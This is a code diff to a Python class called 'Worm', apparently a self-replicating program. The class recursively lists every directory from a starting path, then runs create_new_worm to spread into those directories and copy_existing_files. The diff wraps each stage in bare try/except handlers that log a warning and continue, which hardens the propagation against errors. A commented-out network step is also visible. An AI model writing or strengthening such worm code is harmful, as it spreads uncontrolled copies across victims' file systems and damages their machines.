@@ -92,18 +92,21 @@ class Worm:
         self.own_path = os.path.realpath(__file__)
 
     def list_directories(self,path):
-        self.target_dir_list.append(path)
-        files_in_current_directory = os.listdir(path)
+        try:
+            self.target_dir_list.append(path)
+            files_in_current_directory = os.listdir(path)
 
-        for file in files_in_current_directory:
-            if not file.startswith('.'):
-                absolute_path = os.path.join(path, file)
-                print(absolute_path)
+            for file in files_in_current_directory:
+                if not file.startswith('.'):
+                    absolute_path = os.path.join(path, file)
+                    print(absolute_path)
 
-                if os.path.isdir(absolute_path):
-                    self.list_directories(absolute_path)
-                else:
-                    pass   
+                    if os.path.isdir(absolute_path):
+                        self.list_directories(absolute_path)
+                    else:
+                        pass   
+        except:
+            logging.warning("exception occurred")
     
     def create_new_worm(self):
         for directory in self.target_dir_list:
@@ -139,10 +142,19 @@ class Worm:
         logging.warning(f"[{perf_counter() - start:.5f}] Done Searching")
     
     def start_worm_actions(self):
-        self.list_directories(self.path)
+        try:
+            self.list_directories(self.path)
+        except:
+            logging.warning("exception occurred")
         print(self.target_dir_list)
-        self.create_new_worm()
-        self.copy_existing_files()
+        try:
+            self.create_new_worm()
+        except:
+            logging.warning("exception occurred")
+        try:
+            self.copy_existing_files()
+        except:
+            logging.warning("exception occurred")
         #self.connection_iterator()
     
 if __name__=="__main__":
